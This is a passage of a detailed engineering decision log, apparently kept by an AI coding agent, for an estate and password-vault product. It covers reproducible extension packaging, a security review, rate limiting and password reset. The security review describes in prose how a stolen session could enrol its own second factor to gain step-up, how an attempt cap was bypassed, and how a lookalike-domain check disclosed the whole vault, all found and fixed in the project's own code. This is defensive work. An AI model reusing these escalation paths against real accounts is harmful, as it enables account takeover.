independent ways, each *measured* against `zip 3.0` by producing two differing
archives: per-entry MS-DOS mtime, filesystem walk order, the Unix mode (which
`-X` does **not** strip), Info-ZIP's default UID/GID and extended-timestamp
extra fields, and deflate. With all five pinned the CLI is reproducible on one
machine, so it was not disqualified for being a CLI — it was disqualified
because three of the five then depend on whichever Info-ZIP and zlib the runner
ships, which is exactly the variable a reproducibility claim must not rest on.
`scripts/pack-extension.mjs` writes it instead: the node:crypto webhook verifier
and node:net clamd precedent, on a path whose whole job is to be checkable.

**FOUR FACTORS ARE PINNED; THE FIFTH IS REMOVED, and the first CI run is why.**
It went green — and produced 118,147 bytes where the same commit on a laptop
produced 118,875. Compared entry by entry rather than guessed at: all 42 CRCs
and uncompressed sizes identical, 40 of 42 compressing differently, one *larger*
on CI. So the compile is reproducible across platforms — a stronger result than
there was evidence for before — and deflate is not.

The cause is neither the Node version nor the CPU but **how Node was built**:
Homebrew's is `node_shared_zlib: true` against system zlib 1.2.12, official
builds vendor Chromium's 1.3.1-e00f703. Isolated by running the packer under
official `node:22` in Docker on arm64, which reproduced the x86-64 runner's
digest exactly. Two people on the same OS with the same `node -v` therefore got
different digests depending on where they installed Node — while `VERIFYING.md`
told both of them a mismatch was "a finding worth reporting".

Fixed by **storing every entry** (method 0), so the archive is a pure function
of the compiled bytes plus four constants: no zlib, no Node, no platform. The
factor that could never be tested from inside one Node became an assertion over
both the local and central headers. ~3x size on a 118 KB artifact, invisible to
a store that repackages into CRX3 regardless. *The rule:* when a reproducibility
input cannot be pinned from inside the artifact, remove it rather than label it
— a procedure whose failure mode is "your digest differs, and the remedy is a
paragraph about your package manager" teaches people to shrug at the signal.

**"Two runs matched" is the weakest possible test of this,** and it is what
almost shipped — two runs on one machine seconds apart match because the mtimes,
the walk order and the umask did not change, all three of which a third party
hits. So `pack.spec.ts` *changes* each variable and asserts the digest does not
move, reads entry names and extra-length fields out of the archive bytes rather
than inferring them, and carries an anti-vacuity case proving content still
moves the digest. The order case originally measured APFS rather than the
writer (it passes with the `.sort()` removed, because APFS returns names in
codepoint order anyway); rewritten to assert the contract, and then recorded as
a branch this machine cannot exercise rather than credited with coverage.

**Turbo was silently discarding the origin,** found while writing the CI job.
Strict env mode stripped `VAULT_ORIGIN`, so
`VAULT_ORIGIN=https://vault.example.test pnpm build …` produced a package saying
`http://vault.localhost:3010`. The build script validates what it reads and
throws on a bad value, so its own guard could not help: it never received the
variable. Exit 0, green everywhere, wrong artifact — the M8 PR5 `BFF_URL` defect
verbatim, in the same `turbo.json` whose comment describes it. Fixed by a fence
rather than by a line: `test/turbo-env.spec.ts` reads the build command out of
`package.json`, follows it to the scripts it runs, scans those for `process.env`
reads and requires each to be declared, with an anti-vacuity floor.
Mutation-tested four ways.

**The CI job is its own workflow** because it is the only place in the repo
asking for `id-token: write`, and that escalation belongs beside its subject
rather than inside a file about container images. It builds twice with `--force`
on both (a cache hit restores outputs without compiling, which would compare a
build against a copy of itself), deletes `dist` between them, and fails on a
mismatch. *Bounded, and said so:* two builds on one runner prove determinism
given one toolchain; cross-machine reproducibility is what the third-party
rebuild tests. Attestation is skipped on `pull_request`. The notify-on-failure
wiring was deliberately not copied — its gate can only fire on
`workflow_dispatch`, which has a human watching by definition.

**Node is not pinned to a patch, and after the STORED change need not be.** The
original reasoning — freezing the patch would mean building a *security*
artifact on a runtime that cannot take security patches, so label the digest
instead — is sound, and its premise is gone: with nothing compressed, Node's
version and build do not reach the archive at all. The version still travels in
the `.sha256` beside the commit and the origin, as provenance rather than as
something a verifier has to match.

**`VERIFYING.md` leads with what it cannot establish.** It can show the archive
came from this repo's `Extension` workflow at a named commit — via
`gh attestation verify --signer-workflow`, and that flag is the load-bearing
part, since without it you learn only that *some* workflow here built it — and
that the archive is byte-for-byte what the source produces. It cannot show the
source is safe, and it **cannot show the copy your browser is running is that
archive**: stores repackage into CRX3 with their own signature and add
`_metadata/verified_contents.json`, so a store install is compared file-by-file
against an extracted rebuild, never by zip digest. The load step is manual,
which discharges the debt PR3b recorded — Chrome 151 has disabled
`--load-extension`, so no recipe may be phrased around it.

**Correction carried by this PR:** the M16 roadmap promised the procedure "at a
`/.well-known/` path". RFC 8615 requires well-known URIs to be IANA-registered,
so a path we invent is not one; the registered mechanism is `security.txt`'s
`Policy:` field (RFC 9116), and the vault edge's static handler serves exactly
four extensions, none of them `.txt`. Published in-repo, with the served path
deferred and both obstacles named.

#### PR5 — the security review

Seven file-scoped discovery lenses over the M16 range (never a diff range — the
M13 lesson, and this range is 130 files), each in its own git worktree detached
at the commit under review, then **every candidate confirmed by measurement
before anything was changed**: mutation, or execution against real Postgres, a
real jsdom page, or the modules run directly under `node
--experimental-strip-types`. 21 candidates, no agents lost. A verdict is not
evidence, so no finding was acted on because an agent said so.

**TENTH milestone running where every confirmed finding sits in machinery the
milestone introduced — with one exception, and it is the most serious thing in
the review.**

**THE WORST ONE IS OLDER THAN M16.** `POST /v1/auth/totp/enroll` has been
`SessionGuard`-only since M2. `revokeUnverifiedTotp` spares a VERIFIED method
while `findActiveTotp` takes the NEWEST, so a caller holding nothing but a
stolen session could enrol a secret OF THEIR OWN, confirm it with a code they
computed themselves, and step up. Three ordinary requests, no guessing, and
step-up stops being a second factor for anyone holding a session — vault reset,
document generation, export, beneficiary changes, deletion. Measured end to end,
including the half that makes it a lockout as well as a takeover: the owner's
own authenticator answers 401 afterwards, which is docs/03 §5.1's liveness proof
gone. The repository had already SEEN the mechanism and filed it as a
test-seeding nuisance (CLAUDE.md 2026-08-06). M16 is what made it acute — it
built an attempt cap whose whole premise is that step-up bounds a stolen
credential. Enrolment is now step-up gated WHEN A VERIFIED FACTOR EXISTS; the
first enrolment cannot be gated and that residual is stated rather than implied.

**AND THE CAP WAS BYPASSABLE, AND WAS A LOCKOUT.** Two independent defects in
the machinery M16 introduced, both measured against real Postgres.
`POST /v1/auth/totp/verify` checks the same secret with no cap and writes a kind
the counter did not count — forty guesses, forty 401s, counter zero, then the
found code elevated on the first try. And the cap was keyed on the USER with
every session writing into it, so five wrong codes from one stolen credential
refused the owner's own sessions, renewably, forever. `stepup.ts` had named that
exact harm and claimed a rolling window escaped it. Both closed: one gate over a
SET of routes, and two scopes so a stolen credential exhausts itself under an
account ceiling that stays the real bound.

**ONE IDN PAGE RETURNED THE WHOLE VAULT.** `isConfusable` flagged any punycode
on either side without comparing the two — not a comparison at all — and
`matchesFor` keeps confusable verdicts, so every saved item's title and domain
came back on any internationalised page. Precisely the disclosure `matchesFor`'s
docstring says the design prevents, and it fired the lookalike refusal (the one
phishing bound §4 TB9 commits to) on every item at once. Deleting the clause
gave up nothing the boundary needed — filling requires equality — and the
page-level notice replaces the per-item claim.

**Also found and fixed:** a doubled trailing dot collapsed two registrants onto
a bare suffix, because `normaliseHost` stripped one dot and ran twice on
different strings; a failed unlock left the AUK and SRP private key resident
with no idle clock armed; a revoked pairing forgot the session and kept the
Secret Key, so the protective path was weaker than the voluntary one; a refused
injection rendered as "no password field was found"; the edge's credential
precedence fell through to the cookie on a malformed `Authorization`; the
route-audience fence was keyed on the decorator's NAME while the guards read the
metadata KEY; and two shipped docstrings still said "five vault routes" four PRs
after it became seven.

**"Nothing is ever auto-submitted" was never the extension's to promise.** A
fill must dispatch `input` and `change`, and the reasoning that withholds `blur`
applies to them verbatim — measured, a page's `change` listener holding the real
secret. There is no fix, because the events ARE the fill. What changed is order
(the username is written first, so an early submit no longer sends the secret
with an empty username — which is what it used to do) and the claim, in §4 TB9
and on screen. The fill's origin decision is also re-read AT THE GESTURE now:
the key holder's re-decision was documented as defending against a navigation
between the two calls and compared the same stale string twice, so what actually
stood in the way was a Chromium behaviour nobody measured.

**Not done, and owed.** Nothing in this review ran in a real browser. Whether
Chromium revokes `activeTab` on a cross-origin navigation remains unmeasured
here — the fill-time re-read makes the boundary hold either way, which is why it
was fixed rather than measured, but the answer is still owed.

#### Follow-up — the same escalation through the other factor, and the fence

**Verifying #75's fix found it still open through WebAuthn.**
`POST /v1/auth/webauthn/register/verify` was `SessionGuard`-only and
`WebAuthnService` grants step-up on a successful assertion, so a session-only
caller could bind an authenticator of their own and elevate with it — measured
against real Postgres, the attacker's session row coming back `mfa_level=stepup`.
Quieter than the TOTP version, because the victim's own factors keep working.

**A per-type predicate left a hole in both directions.** `hasVerifiedTotp` is
false for an account holding only a passkey, so the TOTP-only fix would still
have admitted a stolen session enrolling TOTP on a passkey-protected account.
`SecondFactorGate` asks one question over both stores — "does this account hold
ANY factor it could be made to prove" — and is called from `enrollTotp` and both
ends of the WebAuthn ceremony. The bootstrap residual is unchanged.

**And the gate needed a fence, because it is invisible to the others.** The
condition is account state, so it cannot be a `StepUpGuard` decorator, and every
fence that checks step-up gating scans for that decorator — which is how the
WebAuthn route stayed ungated while its twin was fixed one file away.
`test/factor-routes.spec.ts` discovers by what the code DOES, scanning for calls
to the repo methods that write factor state with the receiver resolved from its
TYPE annotation. It found an error in its own table on its first run and a
method-name collision on its second; both are recorded in the decision log.

#### Follow-up — the extension, driven in a real browser by CI

The correction above (that `Extensions.loadUnpacked` works where
`--load-extension` does not) made this possible, and `extension.yml` gains a
`browser-smoke` job. It extracts the PACKED ARCHIVE and drives those bytes:
manifest accepted by Chrome, service worker booted,
`chrome.offscreen.createDocument` succeeding from it, the offscreen document
live, `/lib/vault-crypto/index.js` resolving at its absolute path, a real SRP-6a
unlock against a stand-in speaking the real protocol, an item decrypting to its
title, a wrong Secret Key refused by the server, and the no-key-material-egress
claim asserted over bytes that crossed a real socket.

Every one of those was on PR2b's "unexercised" list. What remains unexercised is
named rather than implied: the fill (it needs a genuine user invocation for
`activeTab`), IndexedDB under the extension origin, and anything about the real
vault service.

**Chrome is deliberately not pinned in that job**, which inverts the rule the
packaging jobs follow. They must pin, because a moving toolchain moves the
digest. This one is watching for the platform to change under the extension, and
pinning would hide exactly what it is there to notice.

### M17 — Account recovery and abuse bounds (approved 2026-08-12)

**Identity declares 23 owner-facing routes and not one of them changes a
password, resets a forgotten one, or changes an address.** (Precisely: 23 on
`AuthController` plus 2 service-credential-guarded settlement-lock routes, so 25
handlers in all. The 23 is the number that matters here — it is the user-facing
surface — but a bound that treated "every identity route" uniformly would
throttle settlement's own account-lock calls on the §5.1 chain.) Every
"password reset" string in these
docs refers to the VAULT password (Zone A, M6) — the account half is not even
recorded as a deferral, which is how it stayed invisible for sixteen milestones.
And there is no rate limiting anywhere: no throttler dependency in any
`package.json`, and `recordLoginFailure` inserts a `login.failed` row
(`auth.service.ts:564`) that nothing reads. `docs/03` §6 lists account takeover
as risk #1 (H/H) with residual treatment "passkey nudges, trusted-contact review
mode, adaptive step-up" — passkey nudges PARTIALLY DISCHARGED by PR5 (the
surface exists; nudging is copy and can follow), the other two still unbuilt.
The zero-hits grep this paragraph originally rested on — no
`webauthn|passkey` match anywhere in `apps/bff/src`, `apps/web/src`,
`apps/vault-web/src` or `apps/vault-extension/src`, identity's four
relying-party routes unreachable since M2, TOTP the only usable factor — was
made false for the first two trees by PR5 and REMAINS TRUE for the vault
origin and the extension, which is docs/03 §6o's recorded residual: a
passkey-only account cannot complete any Zone A step-up-gated ceremony.

**The two halves are mutually enabling and must not be split.** A reset route
without a bound is an enumeration and mail-bomb oracle; a bound without a reset
route is a lockout primitive. The bound itself is not new work in the risky
sense — it generalizes M16's `deniedSinceLastGrant` over the append-only
`auth_events` ledger, which is already twice-reviewed, already two-scoped
(per-session under a per-account ceiling), already rolling rather than sticky,
and whose index debt `005_auth_events_index.sql` already paid.

**Why this rather than the assets surface,** which is the strongest alternative
and which a value-first reading ranks first — fairly, since assets exposes 13
owner-facing routes against a BFF client with exactly three methods, there is no
`[assetId]` route, and `CreateAssetInput` carries no `inTrust`, so the in-trust
badge can only ever read zero for an estate created through the product. The
answer is ORDER, NOT CHOICE, and it turns on cost of delay rather than on
weighing lenses: assets is flat-cost and blocks nothing, while a general rate
limiter touches every request path, so every surface added before it is another
surface to bound. Assets follows immediately. Stated plainly: nothing is
deployed, so this is not a live exposure today — it is a rising build cost and a
hard gate on deploying at all.

**PRs.** PR1 the bound · PR2 password change · PR3 password reset · PR4 address
change · PR5 the passkey surface · PR6 the security review. Each independently
mergeable, each carrying its own docs delta (the M14 rule). PR3 goes third
deliberately, so the bound is already under the most dangerous route in the
milestone. PR5 is severable if the milestone runs long.

**Out of scope, deliberately.** Erasure and account deletion — `destroyDek`
(`packages/crypto/src/dek.ts:170`) stays caller-less this milestone, because
building the most irreversible route in the product inside the milestone that
builds password reset is how one of them gets half-reviewed. Passkey
PROVISIONING for third-party sites (that is an authenticator, not a relying
party — already rejected at M16). Edge/per-IP limiting at the WAF, which is
blocked on the M5 cloud half; what ships is a per-account bound plus a
best-effort per-process one, and that limitation goes in docs/03 §6k in plain
words rather than being implied. Adaptive authentication and device
fingerprinting — `sessions.device_id`, `ip_ct` and `geo` are declared and
written by nothing; decide whether to write them, do not build a risk engine.
Operator-assisted recovery (TB7). And the route↔consumer fence, which is the
right mechanism in the wrong milestone: it would go red on assets, settlement
and plaid the moment it landed, and only whoever closes those gaps can write its
deferral entries truthfully — it ships as PR1 of the assets milestone.

**The decisions this milestone has to take.** Settle each BEFORE the PR that
needs it, not in the review.

1. *Who tells the owner their password just changed?* Identity is deliberately
   NOT a holder of the notifications SEND credential (M14: the service that
   mints sessions must not be able to ring "a death report was filed on your
   account"). A silent password change is unacceptable and so is undoing that
   split. **SETTLED, and this bullet's second option was false as written.**
   There are THREE real options, not two, and "a route through an existing
   holder" is not one of them: `SendSchema` is built per-ROUTE from
   `ESTATE_NOTIFICATION_KINDS` (`notifications/src/schemas.ts`), so there is no
   mechanism anywhere to grant one holder a SUBSET of the estate kinds — adding
   identity to the SEND edge hands it all ten, including `settlement.case_opened`
   and every `emergency.*`. Nor is there a peer path: notifications has no Kafka
   consumer, and identity holds no credential to profile, settlement or vault.
   The three real options are (a) a fifth NOTIFICATIONS edge, (b) widening the
   existing VERIFY edge, whose holder is already identity alone, or (c) a new
   reverse edge to a peer. **(a) is approved**, and (b) is explicitly declined
   on the VERIFY edge's own recorded reasoning: splitting it from RECIPIENTS
   exists so that "the first future holder of a resend capability" does not
   inherit a power it should not, and a support tool or BFF-side resend is
   exactly the plausible future holder that must not also inherit "mail an
   account-security alert". Note also that this is the FIFTH edge on the
   NOTIFICATIONS callee and the EIGHTH in the graph overall — it currently has
   seven, four of them on notifications. Update `credential-graph.ts` as data
   and make the fence red before green.
2. *Does redeeming a reset code grant step-up?* Almost certainly no. This is
   exactly the M15 PR4 shape: an unauthenticated redeem route granted step-up
   while `POST /v1/vault/reset` is gated on step-up ALONE, so a stolen handoff
   code crypto-shredded a Zone A vault. A reset code that grants step-up is a
   vault-destruction primitive delivered by email. **SETTLED STRUCTURALLY: the
   reset MINTS NO SESSION AT ALL** — one request takes `{code, newPassword}`,
   sets the hash, revokes sessions and returns 200 with no tokens; the user logs
   in. There is then no session to withhold a step-up from. This also avoids a
   trap the two-step shape walks into: `AllowSessionAudiences` unconditionally
   PREPENDS `account`, and identity binds no service-wide audience list, so a
   fourth `recovery` audience could not be made exclusive on an identity route —
   a reset-completion route admitting it would ALSO be reachable by every
   ordinary account session, i.e. a set-a-new-password-without-the-current-one
   route behind a stolen bearer. **The last sentence of this bullet is therefore
   rewritten rather than satisfied:** "assert what a reset session cannot do"
   presumes a session exists. PR3 ships a MINT-PATH FENCE instead — a scan
   asserting `sessions.create(` has exactly three call sites, with an
   anti-vacuity floor, mutation-tested by adding a fourth inside the reset
   service.
3. *What does a reset revoke, and what does it explicitly not recover?* Every
   session including 30-day paired extensions. But the Zone A master key derives
   from the vault password + Secret Key under 2SKD, not from the account
   password — so a reset recovers the account and NOT the vault, and the screen
   must say so. Telling someone they have recovered something they have not is
   the worst outcome available here.
4. *Does reset work in `deceased_pending`, and in `settlement`?* M7's status
   allowlist is `('active','deceased_pending')`, and `deceased_pending`
   deliberately keeps the owner's login alive as the §5.1 rescue path — so a
   reset there is arguably required. In `settlement` it must not work, or it
   re-opens a terminally locked account. Restate the predicate inside the reset's
   own SQL; do not read the status and then act on it.
5. *Per-account only, or per-IP too?* Per-IP needs an IP nothing currently
   records, and `sessions.ip_ct` would gain its first writer — a PII column with
   an envelope-encryption obligation. If not taken, write the residual: a
   distributed attacker walks around a per-account bound on `register`.
   **SETTLED: per-account plus per-ADDRESS, and no per-IP.** A per-account bound
   alone is blind to exactly the attack it looks like it stops —
   `recordLoginFailure(null, …)` writes a NULL user for every unresolved
   identifier, and register's duplicate path writes no row at all — so the
   address-keyed half is the PRIMARY bound rather than a nicety. It is
   per-process and in memory: the selector that would make it durable is the
   email blind index, and putting THAT in an append-only table with no `dek_id`
   would permanently record a correlatable identifier for addresses belonging to
   no account. Per-IP stays WAF work blocked on the M5 cloud half, and §4 TB1 —
   which asserted "per-IP+per-account rate limits" as an existing control — is
   corrected rather than left standing. Residual written in docs/03 §6k.
6. *How does the bound avoid being a DoS against the owner?* This is the trap
   M16 PR5 hit and the reason for two scopes. A per-account login cap is
   reachable by anyone who knows the email address, and five wrong passwords
   from an attacker must not lock the owner out. **SETTLED, and M16's escape
   does NOT port**: login has no credential at the point of failure, so there is
   no per-session scope to fall back on and no restructuring invents one. What
   replaces it is that the bound touches the login ROUTE only — a session that
   already exists keeps working and keeps refreshing, because the session
   lookups consult no counter. `test/login-bound.int.spec.ts` drives an attacker
   to the ceiling and shows the owner's live access token and refresh token
   still resolving. The residual (a sustained attack denies NEW logins for that
   account) is stated in docs/03 §6k rather than softened.
7. *Does password change require the current password, step-up, or both?*
   Recommendation: current password AND step-up where a factor exists; current
   password alone where none does. An account with no verified second factor
   cannot be step-up gated — there is nothing to prove — and the current password
   is the one thing a stolen session does not hold.
8. *Should a registered passkey change the reset path?* Gating reset on a passkey
   where one exists removes email as a takeover channel for exactly the users who
   invested in security. Decide it in PR5 or state that it is deliberately not
   taken.

#### PR1 as built — the bound (2026-08-12)

**No DDL.** `auth_events.kind` is unconstrained `TEXT` (verified against the
live cluster: no CHECK, no FK on `user_id`, which is nullable), so new ledger
kinds need no migration, and `005_auth_events_index.sql` already serves every
user-keyed count. The only shared-vocabulary change is two new members of
`AUDIT_ACTIONS` — a closed enum, so the audit consumer must be deployed before
identity emits them (the 2026-08-10 deploy-order hazard).

**The load-bearing discovery, measured before any code was written:** the M16
cap does NOT generalize by adding kinds to `SECOND_FACTOR_FAILURES`/`SUCCESSES`.
The "since the last success" watermark is one shared subquery, so folding
login's kinds in takes a user with four `stepup.denied` rows plus one
`login.succeeded` row from **four denials to zero** — a plain password login,
proving no second factor at all, silently resetting the second-factor cap. The
kind sets became PARAMETERS to `failedAttempts` because of that number, and
`test/rate-bounds.spec.ts` asserts pairwise disjointness across declared bounds.

**Shipped:** `src/rate-bounds.ts` (the bounds as data), `src/address-bound.ts`
(the in-memory half), a parameterized `AuthEventsRepo.failedAttempts`, login and
register wired, and `assertFactorAttemptsAvailable` generalized to
`boundExceeded` + per-bound refusals. `second-factor-kinds.spec.ts` became
`rate-bounds.spec.ts`, with a successor for every assertion it carried plus the
disjointness case and two source-level ordering assertions (address check before
the user lookup; account check after the password verification — both produce a
working limiter, only one closes the timing channel). Twelve mutations
confirmed red, including one that caught a test of mine named for a property it
never reached: the address-forgiveness case stopped one short of the cap and so
passed with the forgiveness deleted.

Coverage floor ratcheted 68/68/39/66 → 70/68/41/68 on the database-free run.

**Driven live against the running stack**, with identity rebuilt from the branch
(image and container both verified seconds old, not what compose said). The
ADDRESS bound is visible in the timings rather than inferred: ten wrong
passwords at ~110 ms each — one Argon2id verification apiece — then the
eleventh at 27 ms, refused before any work, and the CORRECT password refused
straight afterwards with a byte-identical `401 {"error":"invalid_credentials"}`.
The same shape held against an address with NO ACCOUNT, which is the half the
ledger cannot see. The ACCOUNT ceiling refused a correct password at twenty
failures since the last success, wrote `login.rate_limited | decision=account_rate`,
and left the count it bounds unmoved (no self-feeding) — while the owner's
pre-existing access token answered 200 at `GET /v1/auth/session` and their
refresh token answered 200 at `POST /v1/auth/refresh`, which is the
owner-survives property proven rather than argued. Register allowed twenty and
answered `429 {"error":"too_many_attempts"}` on the twenty-first, recording a
refusal with a null actor.

**The deploy-order hazard was OBSERVED, not inferred.** CLAUDE.md's 2026-08-10
entry recorded that events emitted while the audit consumer runs older code
never reach `audit_events`, and said plainly that the rejection had been read
out of `ingestor.ts` rather than seen. It has now been seen: with identity ahead
of audit, the consumer logged
`audit_event_rejected reason=schema_violation` per event with a rising
`rejectedTotal`, and `audit_events` held none of them. After rebuilding the
consumer, zero rejections and both scopes land with exactly the designed
attribution — `actor=null {"scope":"address"}` and
`actor=set {"scope":"account","attempts":"20"}`. Deploy the audit consumer
before identity.

**One probe of mine was wrong before the code was**, and it is worth recording
because the wrong reading was the plausible one: the first attempt to drive the
account ceiling seeded twenty `login.failed` rows at `now() - 1 minute`, which
is BEHIND the `login.succeeded` row the probe's own sign-in had just written.
The predicate counts since the last success, so it correctly returned zero and
the login succeeded — which reads exactly like a bound that does not work.
Checking the ledger ordering before concluding anything is what separated a
broken probe from a broken control.

#### PR2 as built — password change (2026-08-12)

**Three things ship together or the change is wrong.** The route
(`POST /v1/auth/password`, account-audience only, current password AND a
conditional step-up); identity's first `withTransaction` and first
`set_config('app.actor_id')`; and migration 008, which stops `users_versions`
keeping password hashes. The last is an ORDERING requirement rather than a
tidy-up: `CREATE OR REPLACE FUNCTION` only affects future captures, so a
redaction that shipped one release after the first write would leave verifiers
in an append-only table nothing can retract.

**The redaction argument is NOT the vault's, and that matters.** M6 drops
`wrapped_master_key` because a superseded wrapping is a live capability against
the current secret; an old Argon2id hash is not that. What transfers is the
vault comment's *justification* for keeping full images everywhere else — "the
ciphertext in it is readable with the same key as the live row", i.e. the
crypto-shred reaches the capture — and `password_hash` is the one column in
`users` for which that is false. `email_ct` and `dek_id` are kept, deliberately:
they are under the envelope and carry the audit value the trigger exists for.

**The fifth notifications edge, with the cheap option ruled out rather than
skipped.** docs/04 decision 1 offered "a route through an existing holder"; that
is impossible as a narrow grant, because `SendSchema` is built per-ROUTE from
`ESTATE_NOTIFICATION_KINDS` and there is no per-holder subsetting mechanism —
identity would get all ten estate kinds. The real alternative was widening the
VERIFY edge (holder already identity alone), declined on that edge's own
recorded reasoning about the first future holder of a resend capability. Graph
entry written FIRST and the fence watched red (5 failures naming the missing
guard, token, controller, binding and route) before green.

**Verified rather than assumed:** `ESTATE_NOTIFICATION_KINDS` is still ten, so
the three "ten estate notifications" claims in the graph, the controller and the
config stay true — a SYSTEM kind does not change that count.

**Ten mutations confirmed red**, including dropping the redaction, OVER-redacting
the DEK-wrapped columns, dropping the status allowlist from the UPDATE, revoking
the caller's own session, removing the actor, emitting `stepup.granted` (which
would silently void an open §5.1 death case), checking the password before the
step-up gate, and admitting a vault or extension session to the route.

**Driven live against the running stack**, with audit rebuilt and restarted
BEFORE the producers (the PR1 lesson, applied rather than rediscovered): zero
`schema_violation` rejections, against eight in PR1's drive. A wrong current
password answered `401 invalid_credentials` and changed nothing — two sessions
still live, zero version rows. The change answered 204, evicted the other device
(401 at `/v1/auth/session`) while the caller's own session stayed 200, killed the
old password and admitted the new one. The version image came back
`password_hash present: false`, `email_ct present: true`, `dek_id present: true`,
`actor: set` — the redaction, the deliberate keeps, and the attribution, in one
row. The ledger shows `password.change_failed` then `password.changed` and no
`stepup.granted`. The owner got a real SES message ("The password for your Estate
account was just changed…") under the platform's one uniform subject, the send
log recorded `identity.password_changed | outcome=sent_unverified` — M14's
machinery correctly noting an address this probe account never proved — and the
audit event carried `{"notified": "delivered", "revokedSessions": "1"}`.

**Three of my own probes were wrong before the code was**, all caught by
checking what produced the observation rather than believing it. `MIGRATE=0`
while 007 was still the highest applied migration, because the migrate jobs are
SEPARATELY BUILT images and rebuilding the services does not rebuild them. A
`400` from the password route that was a shell bug — an unquoted conditional
`-H "authorization: Bearer $t"` splits on the space and hands curl four broken
arguments — where the route in fact answered 204. And `node
apps/stack/dist/generate-env.js` exiting 0 having written nothing, because the
entrypoint is `generate-env-cli.js`; the tell was the file's mtime, not the exit
code.

**A coverage floor moved for an honest reason.** Identity's database-free number
DROPPED, because PR2's new code is mostly SQL that the PG-gated int suite proves
and that run cannot see. It was not lowered: `test/db.spec.ts` covers
`withTransaction`'s failure paths — rollback, release, a failing rollback not
masking the original error — which are control flow rather than SQL semantics and
were owed regardless. Floor ratcheted 70/68/41/68 → 70/68/42/69.

#### PR3 as built — password reset (2026-08-13)

**It mints nothing**, which is decision 2 answered structurally rather than
obeyed: redemption sets the password and returns no tokens, so there is no
session to withhold a step-up from. `test/mint-paths.spec.ts` is the fence that
property needed — docs/04's "assert what a reset session CANNOT do" presumed one
exists — declaring the three mint paths as data and proving the reset absent,
plus a separate assertion that nothing bypasses the repo with a raw INSERT.

**No second factor, by decision.** A reset requires the mailed code alone, even
for an account holding a verified TOTP or passkey; the residual is written in
docs/03 §6m in those words, because it is a real weakening of M16's investment
and buys the property that nobody is permanently locked out.

**A sixth notifications edge** rather than a widening of VERIFY: a verification
code proves a mailbox and is redeemed by somebody already signed in, while a
reset code is redeemed with no session at all. Graph entry first, fence red (5
failures) before green.

**Ten mutations red**, and three of the four that first survived were MY
MUTATIONS being unfaithful rather than tests being weak — worth recording,
because the harness's "assert the bytes changed" check does not catch a
replacement that changes bytes without changing behaviour. The other survivor
was real: a concurrency case named for the CAS was passing with the CAS deleted,
because it duplicated the UPDATE inline and so proved that Postgres honours a
predicate rather than that the repo's statement carries one. It drives
`markRedeemed` through two open transactions now. Two properties are recorded as
OVER-DETERMINED rather than contorted into mutability: an unknown address cannot
be mailed however the guard is mutated, and expiry is refused at two layers.

**One test-isolation defect found and fixed twice.** The per-address bound lives
on the service instance for the process's lifetime — as in production — so the
eleventh `request()` in the file was silently refused: the bound working and the
suite losing isolation at once. The first fix, a per-case time window, broke the
re-issue floor, because `created_at` is stamped by the DATABASE while the floor
compares against the SERVICE's clock. Isolating by ADDRESS instead separates the
cases on the axis the bound keys on and leaves both clocks in one frame.

**Still owed:** a surface. PR3 ships routes no BFF resolver and no screen call,
which is a zero-callers gap of exactly the kind this repo keeps closing —
recorded in §6m rather than left to be discovered.

#### PR4 as built — the address change (2026-08-13)

**VERIFY-THEN-SWITCH**, forced rather than chosen: login resolves users by
`email_bidx`, so a change-then-verify design that stored a typo'd address would
lock its owner out of LOGIN ITSELF the moment their sessions lapsed. The new
address is proved by an `EC1-` code mailed to it before anything on file moves,
which also discharges the M14 forward commitment one step stronger than it
asked — no unproven address ever reaches the delivery store, so `verified_at`
is stamped by replacement (`RecipientsRepo.replace`, one statement) rather than
cleared. The staged address is encrypted at request time as `users.email` under
the live DEK; the switch moves ciphertext with a `dek_id` predicate restated
inside the UPDATE, and `ux_users_email` is the raced-register backstop.

**The seventh notifications edge** (`NOTIFICATIONS_EMAIL_CHANGE_INTERNAL_TOKEN`,
identity alone) carries the challenge because the destination is inexpressible
on every prior wire — VERIFY's recorded grant is "can only mail to whatever is
already on file", and an address field on it would hand a future resend-tool
holder the power the M14 split forbids. It is the ONE send whose payload names
a destination; the notifications service delivers once and stores nothing. The
graph fence went RED first (five assertions naming the missing config), then
green; wire-parity, the kind sweep, the template registry, the client
partitioning sweep and the stack parity fences each demanded their declaration
in turn — six derived fences, six red-then-green, no hand-remembered list
anywhere.

**Completion is one transaction:** CAS-spend the change, switch the address,
revoke outstanding `PR1-`/`EV1-` codes (the §6m obligation — both were mailed
to the mailbox being left; the two repos' `revokeLive` gained an optional
`Queryable` for exactly this), revoke every session but the caller's. Then, in
pinned order: `identity.email_changed` to the OLD address (the store still
resolves it — ordering is what makes the takeover notice reach the one reader
who can dispute it, and the copy does not offer sign-in because that reader
structurally cannot), then the recipient replacement. Outcomes ride the audit
event (`oldNotified`, `recipientReplaced`, `revokedSessions`).

**Uniformity:** a taken address is a mail that never arrives behind a uniform
202 (register's posture), with the availability lookup DETACHED from the
response and the detach pinned at the source; redemption's refusals are one
`invalid_code` including the raced-register case at the switch, which burns no
attempt (the code was right; the world changed). The attempt cap is
attributable BY DESIGN — the selector is the authenticated caller, so the M14
round-2 mechanic is designed in rather than retrofitted.

**Proof:** 15 int cases against real Postgres (the CAS driven through two open
clients; the sweep, the session revocation, the versions-trigger attribution
and the notify-before-replace ordering all asserted), 19 decision cases with
the repo faked plus two source pins (gate order; the detach), 2 audit-emitter
cases pinning the PII firewall, 4 notifications int cases (replace stamps a
FRESH proof against a planted ancient one; the store-less send touches no
recipient state), and identity's no-DB floor RATCHETED UP 69/67/41/68 →
70/67/43/69 — reversing PR3's exception. §6h's permanent-lockout residual is
CLOSED (§6n), with the stale-re-feed race and the no-surface gap recorded as
residuals.

#### PR5 as built — the passkey surface (2026-08-13)

**The design decision everything followed from: web-only, with the boundary
said out loud.** Extending the ceremony to the vault origin is an identity
change (one `rpOrigin` becomes a list), an audience widening on both assertion
legs, two vault-edge proxy entries and a fence table update — not a client
patch — so the scope line is drawn at the web app and docs/03 §6o records what
that costs: a passkey-only account cannot complete any Zone A step-up-gated
ceremony, and the passkeys section SAYS SO on screen (the M16 honesty pattern).

**The sweep found two defects in the shipped machinery before the surface
landed on it** (the PR4 pattern): `hasCredentials` ignored `revoked_at` —
latent until the first revoke route armed it, whereupon revoking the last
passkey on a TOTP-less account would have locked factor enrolment and every
arming gate permanently — and the same-authenticator-second-account unique
violation was an unhandled 500 on a security route. Both fixed with the
predicate landing IN THE SAME CHANGE as the column's first writer.

**The management vertical shipped as a precondition** (the M16 rule): list,
rename and revoke routes, with revoke STEP-UP GATED — deliberately unlike the
ungated M16 session revoke, because removing a factor weakens the gate that
protects everything else (ungated + stolen bearer = factor-strip downgrade
